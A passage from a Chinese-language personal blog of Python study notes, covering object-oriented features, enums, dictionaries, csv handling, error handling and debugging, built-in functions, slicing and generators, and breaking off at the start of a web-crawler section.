s.name <span class="comment">#删除实例的name属性</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;s.name</span><br><span class="line"><span class="string">'Student'</span></span><br></pre></td></tr></table></figure><h3 id="面向对象（高级）"><a href="#面向对象（高级）" class="headerlink" title="面向对象（高级）"></a>面向对象（高级）</h3><h4 id="使用”slots“"><a href="#使用”slots“" class="headerlink" title="使用”slots“"></a>使用”<strong>slots</strong>“</h4><p><strong>slots</strong>仅对当前类实例起作用，对继承的子类是不起作用的</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">Student</span>(<span class="symbol">object</span>):</span><br><span class="line"><span class="symbol">__slots__</span> = ("<span class="symbol">name</span>","<span class="symbol">age</span>") #使用<span class="symbol">tuple</span>定义允许绑定的属性名称</span><br></pre></td></tr></table></figure><h4 id="使用-property"><a href="#使用-property" class="headerlink" title="使用@property"></a>使用@property</h4><p>python内置的@porperty装饰器就是负责把一个方法变成属性调用的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">score</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._score</span><br><span class="line"></span><br><span class="line"><span class="meta">    @score.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">score</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, int):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'score must be an integer!'</span>)</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">0</span> <span class="keyword">or</span> value &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'score must between 0 ~ 100!'</span>)</span><br><span class="line">        self._score = value</span><br></pre></td></tr></table></figure><p>@property 的使用 ， 把一个getter方法变成属性，只需要加上@property就可以了，此时，@property本身又创建了另一个装饰器@score.setter ，负责把一个setter方法变成属性赋值，于是，我们就拥有了一个可控的属性操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s =  Student()</span><br><span class="line">s.score = <span class="number">60</span> <span class="comment">#OK, 实际转化为s.set_score(60)</span></span><br><span class="line">s.score <span class="comment">#OK，实际转化为s.get_score()</span></span><br><span class="line"><span class="number">60</span> </span><br><span class="line">s.score = <span class="number">9999</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ValueError: score must between <span class="number">0</span> ~ <span class="number">100</span>!</span><br></pre></td></tr></table></figure><p>在加上@property时，对实例属性操作的时候，就知道该属性很可能不是直接暴露的，而是通过getter和setter方法来实现的，还可以定义只读属性，只定义getter方法，不定义setter方法就是一个只读属性:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">birth</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._birth</span><br><span class="line"></span><br><span class="line"><span class="meta">    @birth.setter   #可读写</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">birth</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        self._birth = value</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self)</span>:</span>  <span class="comment">#只读</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2015</span> - self._birth</span><br></pre></td></tr></table></figure><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p>class A(a,b): A类继承 a，b类 </p><h4 id="定制类"><a href="#定制类" class="headerlink" title="定制类"></a>定制类</h4><p>定义并实现特殊名称的函数 ，实现相对应的</p><h4 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h4><p>python提供Enum类来实现枚举类</p><p>通常将枚举类型定义为一个class类型，然后，每个常量都是class的一个唯一实例。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line">Month = Enum(<span class="string">'Month'</span>, (<span class="string">'Jan'</span>, <span class="string">'Feb'</span>, <span class="string">'Mar'</span>, <span class="string">'Apr'</span>, <span class="string">'May'</span>, <span class="string">'Jun'</span>, <span class="string">'Jul'</span>, <span class="string">'Aug'</span>, <span class="string">'Sep'</span>, <span class="string">'Oct'</span>, <span class="string">'Nov'</span>, <span class="string">'Dec'</span>))</span><br><span class="line"><span class="comment">#可以直接使用 Month.Jan来引用一个常量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name, member <span class="keyword">in</span> Month.__members__.items():</span><br><span class="line">    print(name, <span class="string">'=&gt;'</span>, member, <span class="string">','</span>, member.value) <span class="comment">#枚举它的所有成员</span></span><br><span class="line">    value属性则是自动赋给成员的int常量，默认从<span class="number">1</span>开始计数</span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> name,member <span class="keyword">in</span> Month.__members__.items():</span><br><span class="line"><span class="meta">... </span>    print(name,<span class="string">"=&gt;"</span>,member,<span class="string">','</span>,member.value)</span><br><span class="line">...</span><br><span class="line">Jan =&gt; Month.Jan , 1</span><br><span class="line">Feb =&gt; Month.Feb , 2</span><br><span class="line">Mar =&gt; Month.Mar , 3</span><br><span class="line">Apr =&gt; Month.Apr , 4</span><br><span class="line">May =&gt; Month.May , 5</span><br><span class="line">Jun =&gt; Month.Jun , 6</span><br><span class="line">Jul =&gt; Month.Jul , 7</span><br><span class="line">Aug =&gt; Month.Aug , 8</span><br><span class="line">Sep =&gt; Month.Sep , 9</span><br><span class="line">Oct =&gt; Month.Oct , 10</span><br><span class="line">Nov =&gt; Month.Nov , 11</span><br><span class="line">Dec =&gt; Month.Dec , 12for name,member in Month.__members__.items():</span><br><span class="line"><span class="meta">... </span>    print(name,<span class="string">"=&gt;"</span>,member,<span class="string">','</span>,member.value)</span><br><span class="line">...</span><br><span class="line">Jan =&gt; Month.Jan , 1</span><br><span class="line">Feb =&gt; Month.Feb , 2</span><br><span class="line">Mar =&gt; Month.Mar , 3</span><br><span class="line">Apr =&gt; Month.Apr , 4</span><br><span class="line">May =&gt; Month.May , 5</span><br><span class="line">Jun =&gt; Month.Jun , 6</span><br><span class="line">Jul =&gt; Month.Jul , 7</span><br><span class="line">Aug =&gt; Month.Aug , 8</span><br><span class="line">Sep =&gt; Month.Sep , 9</span><br><span class="line">Oct =&gt; Month.Oct , 10</span><br><span class="line">Nov =&gt; Month.Nov , 11</span><br><span class="line">Dec =&gt; Month.Dec , 12</span><br></pre></td></tr></table></figure><p>如果需要更精确的控制枚举类型，可以从Enum派生出自定义类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"></span><br><span class="line"><span class="meta">@unique</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Weekday</span><span class="params">(Enum)</span>:</span></span><br><span class="line">    Sun = <span class="number">0</span> <span class="comment"># Sun的value被设定为0</span></span><br><span class="line">    Mon = <span class="number">1</span></span><br><span class="line">    Tue = <span class="number">2</span></span><br><span class="line">    Wed = <span class="number">3</span></span><br><span class="line">    Thu = <span class="number">4</span></span><br><span class="line">    Fri = <span class="number">5</span></span><br><span class="line">    Sat = <span class="number">6</span></span><br><span class="line">   <span class="comment"># `@unique`装饰器可以帮助我们检查保证没有重复值</span></span><br></pre></td></tr></table></figure><h4 id="元类"><a href="#元类" class="headerlink" title="元类"></a>元类</h4><p>动态语言和静态语言最大的不同，就是函数和类的定义，不是编译时定义的，而是运行时动态创建的。</p><p>type()函数可以查看一个类型或变量的类型，我们说class的定义是运行时动态创建的，而创建class的方法就是使用type()函数</p><p>type()函数既可以返回一个对象的类型，又可以创建出新的类型，比如，我们可以同各国type()函数创建Hello类，而无需通过class Hello(object)…的定义:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span><span class="params">(<span class="keyword">self</span>,name=<span class="string">'world'</span>)</span></span>:<span class="comment">#先定义函数</span></span><br><span class="line">print(<span class="string">'hello, %s'</span> % name)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; Hello = type(<span class="string">'Hello'</span>, (object,), dict(hello=fn)) <span class="comment"># 创建Hello class</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; h = Hello()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; h.hello()</span><br><span class="line">hello, world</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;type(Hello)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">type</span>'&gt;</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; type(h)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">Hello</span>'&gt;</span></span><br></pre></td></tr></table></figure><p>要创建一个class对象，<code>type()</code>函数依次传入3个参数：</p><ol><li>class的名称；</li><li>继承的父类集合，注意Python支持多重继承，如果只有一个父类，别忘了tuple的单元素写法；</li><li>class的方法名称与函数绑定，这里我们把函数<code>fn</code>绑定到方法名<code>hello</code>上。</li></ol><p>通过<code>type()</code>函数创建的类和直接写class是完全一样的，因为Python解释器遇到class定义时，仅仅是扫描一下class定义的语法，然后调用<code>type()</code>函数创建出class。</p><p>正常情况下，我们都用<code>class Xxx...</code>来定义类，但是，<code>type()</code>函数也允许我们动态创建出类来，也就是说，动态语言本身支持运行期动态创建类，这和静态语言有非常大的不同，要在静态语言运行期创建类，必须构造源代码字符串再调用编译器，或者借助一些工具生成字节码实现，本质上都是动态编译，会非常复杂。</p><p>metaclass,直译为元类</p><p>先定义metaclass ，就可以创建类，最后创建实例</p><p>metclass  基本不会使用</p><h3 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h3><p>python中的小括号( )：代表tuple元组数据类型，元组是一种不可变序列。</p><p>python中的中括号[ ]，代表list列表数据类型：</p><p>python大括号{ }花括号：代表<a href="https://www.baidu.com/s?wd=dic&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y3nhnYuWRkPj61nAfknj-W0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EPj6YrHcsnHcY" target="_blank" rel="noopener">dic</a>t字典数据类型，字典是由键对值组组成(key=&gt;value)。冒号’:’分开键和值，逗号’,’隔开组。用大括号创建的方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dic  = &#123;<span class="string">'jon'</span>:<span class="string">'boy'</span>,<span class="string">'lili'</span>:<span class="string">'girl'</span>&#125;</span><br><span class="line">dic</span><br><span class="line"></span><br><span class="line">output： &#123;<span class="string">'jon'</span>:<span class="string">'boy'</span>,<span class="string">'lili'</span>:<span class="string">'girl'</span>&#125;</span><br><span class="line">dic[<span class="string">'jon'</span>]</span><br><span class="line">output: <span class="string">'boy'</span></span><br><span class="line">dic[<span class="string">'jon'</span>] = <span class="string">'boy_girl'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dic[<span class="string">'jon'</span>]</span><br><span class="line"><span class="string">'boy_girl'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="字典-使用”-”创建"><a href="#字典-使用”-”创建" class="headerlink" title="字典(使用”{}”创建)"></a>字典(使用”{}”创建)</h4><p>删除字典元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Zara'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line">dict.clear()  <span class="comment">#清空字典所有条目</span></span><br><span class="line"><span class="keyword">del</span> dict[<span class="string">'Name'</span>] <span class="comment">#删除键是'Name'的条目</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result = &#123;&#125;</span><br><span class="line">result[<span class="string">"abc"</span>] = <span class="string">"111"</span></span><br><span class="line">result</span><br><span class="line">&#123;<span class="string">'abc'</span>: <span class="string">'111'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> dict_name:</span><br><span class="line">result[row[<span class="string">'name'</span>]] = row[<span class="string">'score'</span>]</span><br></pre></td></tr></table></figure><h3 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h3><h4 id="csv文件处理"><a href="#csv文件处理" class="headerlink" title="csv文件处理"></a>csv文件处理</h4><p><a href="https://blog.csdn.net/guoziqing506/article/details/52014506" target="_blank" rel="noopener">参考</a></p><p>csv库    csv文件多以字典形式存储数据 </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取csv至字典</span></span><br><span class="line">csvFile = open(<span class="string">"example.csv"</span>, <span class="string">"r"</span>)</span><br><span class="line">reader = csv.reader(csvFile</span><br><span class="line"><span class="comment"># 建立空字典</span></span><br><span class="line"><span class="literal">result</span> = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">item</span> <span class="keyword">in</span> reader:</span><br><span class="line">    <span class="comment"># 忽略第一行</span></span><br><span class="line">    <span class="keyword">if</span> reader.line_num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="literal">result</span>[<span class="built_in">item</span>[<span class="number">0</span>]] = <span class="built_in">item</span>[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">csvFile.close()</span><br><span class="line">print(<span class="literal">result</span>)</span><br><span class="line"><span class="comment">#使用for循环迭代访问reader对象会发现每一行都是一个列表，列表的每个元素就是CSV文档的每一行中“，”分割开的数据</span></span><br></pre></td></tr></table></figure><p>csv库中提供了DictReader()函数直接将csv文档读取为字典</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">csvFile = <span class="keyword">open</span>(<span class="string">"example.csv"</span>, <span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">dict_reader = csv.<span class="type">DictReader</span>(csvFile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> dict_reader:</span><br><span class="line">    <span class="built_in">print</span>(row)</span><br></pre></td></tr></table></figure><h3 id="错误、调试和测试"><a href="#错误、调试和测试" class="headerlink" title="错误、调试和测试"></a>错误、调试和测试</h3><p>当我们认为某些代码可能会出错时，就可以用<code>try</code>来运行这段代码，如果执行出错，则后续代码不会继续执行，而是直接跳转至错误处理代码，即<code>except</code>语句块，执行完<code>except</code>后，如果有<code>finally</code>语句块，则执行<code>finally</code>语句块，至此，执行完毕。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'try...'</span>)</span><br><span class="line">    r = 10 / 0</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'result:'</span>, r)</span><br><span class="line">except ZeroDivisionError as e:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'except:'</span>, e)</span><br><span class="line">finally:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'finally...'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">'END'</span>)</span><br></pre></td></tr></table></figure><p>此外，如果没有错误发生，可以在<code>except</code>语句块后面加一个<code>else</code>，当没有错误发生时，会自动执行<code>else</code>语句：</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>print  </p><p>logging </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig(<span class="keyword">level</span>=logging.<span class="keyword">INFO</span>)</span><br><span class="line">它允许你指定记录信息的级别，有<span class="keyword">debug</span>，<span class="keyword">info</span>，<span class="built_in">warning</span>，error等几个级别，当我们指定<span class="keyword">level</span>=<span class="keyword">INFO</span>时，logging.<span class="keyword">debug</span>就不起作用了。同理，指定<span class="keyword">level</span>=<span class="built_in">WARNING</span>后，<span class="keyword">debug</span>和<span class="keyword">info</span>就不起作用了。这样一来，你可以放心地输出不同级别的信息，也不用删除，最后统一控制输出哪个级别的信息</span><br><span class="line">logging.<span class="keyword">info</span>()</span><br></pre></td></tr></table></figure><p>python -m pdb  file_name.py   在命令行界面单步调试</p><p>pdb.set_trace()</p><p>这个方法也是用pdb，但是不需要单步执行，我们只需要<code>import pdb</code>，然后，在可能出错的地方放一个<code>pdb.set_trace()</code>，就可以设置一个断点：</p><h3 id="数字日期和时间"><a href="#数字日期和时间" class="headerlink" title="数字日期和时间"></a>数字日期和时间</h3><h4 id="随机选择"><a href="#随机选择" class="headerlink" title="随机选择"></a>随机选择</h4><p>从既定范围内提取出N个不同元素样本进一步操作</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">values = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">random.sample(values,<span class="number">2</span>)  #从values列表中随机抽取两个</span><br></pre></td></tr></table></figure><p>要想从一个序列中随机的抽取一个元素，可以使用 random.choice()：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">random</span>.choice(<span class="built_in">values</span>)</span><br></pre></td></tr></table></figure><h2 id="function（内置）"><a href="#function（内置）" class="headerlink" title="function（内置）"></a>function（内置）</h2><h3 id="ord-c"><a href="#ord-c" class="headerlink" title="ord(c)"></a>ord(c)</h3><p>c – 字符 , 返回对应的十进制整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;ord(<span class="string">'a'</span>)</span><br><span class="line"><span class="number">97</span></span><br><span class="line">&gt;&gt;&gt;ord(<span class="string">'b'</span>)</span><br><span class="line"><span class="number">98</span></span><br></pre></td></tr></table></figure><h3 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h3><p>example: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X = <span class="keyword">lambda</span> a:a+<span class="number">10</span></span><br><span class="line">print(x(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure><p>lambda +参数(s) :  参数的运算</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x =<span class="keyword">lambda</span> a1, a2: a1+a2</span><br><span class="line">x(<span class="number">6</span>,<span class="number">5</span>) = <span class="number">6</span>+<span class="number">5</span>=<span class="number">11</span></span><br><span class="line">print(x(<span class="number">6</span>,<span class="number">5</span>))=<span class="number">11</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>参数中间用” ,  “隔开</strong> </p></blockquote><h3 id="datetime-类函数"><a href="#datetime-类函数" class="headerlink" title="datetime 类函数"></a>datetime 类函数</h3><p>时间格式一般为 %Y-%m-%d %H:%M:%S</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">现在时间</span><br><span class="line"></span><br><span class="line">nowtime = datetime.datetime.now().strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>)</span><br></pre></td></tr></table></figure><h3 id="filter（）"><a href="#filter（）" class="headerlink" title="filter（）"></a>filter（）</h3><p>fillter()函数用于过滤序列，fillter()接收一个函数和一个序列，把传入的函数依次作用于每个元素，然后根据返回值是True还是False决定保留还是丢弃该元素。</p><p>例如 一个list中删掉偶数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(filter(<span class="keyword">lambda</span> n: n%<span class="number">2</span>==<span class="number">1</span>,range(<span class="number">1</span>,<span class="number">20</span>)))</span><br></pre></td></tr></table></figure><h3 id="locals（）"><a href="#locals（）" class="headerlink" title="locals（）"></a>locals（）</h3><p>locals()函数会议字典类型返回当前位置的全部局部变量</p><p>对于函数，方法，lambda函式，类 ，以及实现了<strong>calll</strong>方法的类实例，它都返回True</p><h3 id="hex（x"><a href="#hex（x" class="headerlink" title="hex（x)"></a>hex（x)</h3><p>返回16禁止数，以字符串形式表示</p><h3 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h3><p>该方法返回字符串在字符串中出现的次数</p><h2 id="一个在线调试python代码的工具"><a href="#一个在线调试python代码的工具" class="headerlink" title="一个在线调试python代码的工具"></a>一个在线调试python代码的工具</h2><p><img src="C:%5CUsers%5C22334%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200304215758306.png" alt="image-20200304215758306"></p><h2 id="一些骚操作"><a href="#一些骚操作" class="headerlink" title="一些骚操作"></a>一些骚操作</h2><h3 id="字符串分片"><a href="#字符串分片" class="headerlink" title="字符串分片"></a>字符串分片</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s[:<span class="number">-1</span>] <span class="comment"># 等价于 s[0:len(s)]，除了最后一个元素的切片</span></span><br><span class="line">L= list(range(<span class="number">100</span>))</span><br><span class="line">L[:<span class="number">10</span>]  取出前<span class="number">10</span>个数</span><br><span class="line">L[<span class="number">-10</span>:] 后<span class="number">10</span>个数</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X[:,0]是numpy中数组的一种写法，表示对一个二维数组，取该二维数组第一维中的所有数据，第二维中取第0个数据，直观来说，X[:,0]就是取所有行的第0个数据, X[:,1] 就是取所有行的第1个数据。</span><br><span class="line">x[n,:]是提取第1维中下标为n的元素的所有值</span><br><span class="line">x[:,m:n]，即取所有数据的第m到n-1列数据，含左不含右</span><br></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h4 id="group"><a href="#group" class="headerlink" title="group()"></a>group()</h4><p>在正则表达式中用于获取分段截获的字符串</p><p>一般，m.group(N) 返回第N组括号匹配的字符。</p><h4 id="groups"><a href="#groups" class="headerlink" title="groups()"></a>groups()</h4><p>m.groups() 返回所有括号匹配的字符，以tuple格式。</p><h3 id="高级列表"><a href="#高级列表" class="headerlink" title="高级列表"></a>高级列表</h3><p>切片，迭代，列表生成式， 迭代器, 生成器</p><h4 id="迭代器（interable）"><a href="#迭代器（interable）" class="headerlink" title="迭代器（interable）"></a>迭代器（interable）</h4><p>我们已经知道，可以直接作用于<code>for</code>循环的数据类型有以下几种：</p><p>一类是集合数据类型，如<code>list</code>、<code>tuple</code>、<code>dict</code>、<code>set</code>、<code>str</code>等；</p><p>一类是<code>generator</code>，包括生成器和带<code>yield</code>的generator function。</p><p>这些可以直接作用于<code>for</code>循环的对象统称为可迭代对象：<code>Iterable</code>。</p><p>可以使用<code>isinstance()</code>判断一个对象是否是<code>Iterable</code>对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line">isinstance([], Iterable)</span><br></pre></td></tr></table></figure><p>可以被next()函数调用并不断返回下一个值的对象成为迭代器：<strong>Iterator</strong></p><h4 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h4><p>1，把一个列表生成式的[]改成()，就创建了一个generator（可迭代）</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g = (<span class="symbol">x</span> * <span class="symbol">x</span> <span class="keyword">for</span> <span class="symbol">x</span> in range(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><p>此时g保存的就是算法： x * x for x in range(10)， </p><p>yield 关键字，如果一个函数定义中包含yield关键字，那么这个函数就不再是一个普通函数,而是一个generator;</p><p>generator和函数的执行流程不一样，函数为顺序执行，遇到return 语句或者最后一行函数语句就返回。generator 在每次调用next()的时候执行，遇到<strong>yield</strong>语句返回，再次执行时从上次返回的<strong>yield</strong>语句处继续执行。</p><p>for 循环调用generator时，必须捕获StopIteration错误，返回值包含在StopIteration的value中</p><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p>isinstance(objet,class)函数，</p><p>isinstance()判断的是一个对象是否是该类型本身，或者位于该类型的父继承链上</p><h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><h3 id="urllib模块"><a href="#urllib模块" class="headerlink" title="urllib模块"></a>urllib模块</h3><h4 id="usrl-pase"><a href="#usrl-pase" class="headerlink" title="usrl.pase"></a>usrl.pase</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 